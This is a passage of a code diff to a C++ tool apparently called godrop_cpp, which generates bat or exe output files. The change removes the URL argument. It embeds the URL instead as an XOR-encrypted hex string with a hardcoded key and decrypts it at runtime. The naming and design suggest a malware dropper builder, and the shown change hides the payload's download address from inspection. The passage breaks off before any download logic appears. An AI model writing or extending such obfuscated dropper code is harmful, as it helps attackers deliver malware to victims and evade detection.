@@ -1,18 +1,49 @@
-#include <array>
-#include <fstream>
+#include <cstdlib>
 #include <iostream>
 #include <string>
+#include <vector>
+
+const std::string kEncryptionKey = "GoDropEmbedKey2026";
+const std::string kEncryptedUrlHex = "__ENC_URL__";
+
+std::vector<unsigned char> DecodeHex(const std::string& hex) {
+    std::vector<unsigned char> out;
+    out.reserve(hex.size() / 2);
+
+    for (std::size_t i = 0; i + 1 < hex.size(); i += 2) {
+        out.push_back(static_cast<unsigned char>(std::stoi(hex.substr(i, 2), nullptr, 16)));
+    }
+
+    return out;
+}
+
+std::string DecryptEmbeddedUrl() {
+    auto cipher = DecodeHex(kEncryptedUrlHex);
+
+    std::string plain;
+    plain.resize(cipher.size());
+    for (std::size_t i = 0; i < cipher.size(); ++i) {
+        plain[i] = static_cast<char>(cipher[i] ^ static_cast<unsigned char>(kEncryptionKey[i % kEncryptionKey.size()]));
+    }
+
+    return plain;
+}
 
 int main(int argc, char* argv[]) {
-    if (argc < 3) {
-        std::cout << "Usage: godrop_cpp <url> <out> [bat|exe] [locale]" << std::endl;
+    if (argc < 2) {
+        std::cout << "Usage: godrop_cpp <out> [bat|exe] [locale]" << std::endl;
         return 1;
     }
 
-    std::string url = argv[1];
-    std::string out = argv[2];
-    std::string type = argc > 3 ? argv[3] : "bat";
-    std::string locale = argc > 4 ? argv[4] : "en";
+    std::string out = argv[1];
+    std::string type = argc > 2 ? argv[2] : "bat";
+    std::string locale = argc > 3 ? argv[3] : "en";
+    std::string url = DecryptEmbeddedUrl();
+
+    if (url.rfind("http://", 0) != 0 && url.rfind("https://", 0) != 0) {
+        std::cerr << "Embedded URL must use http or https." << std::endl;
+        return 1;
+    }
 
     if (type != "bat" && type != "exe") {
         std::cerr << "Only bat and exe are supported." << std::endl;
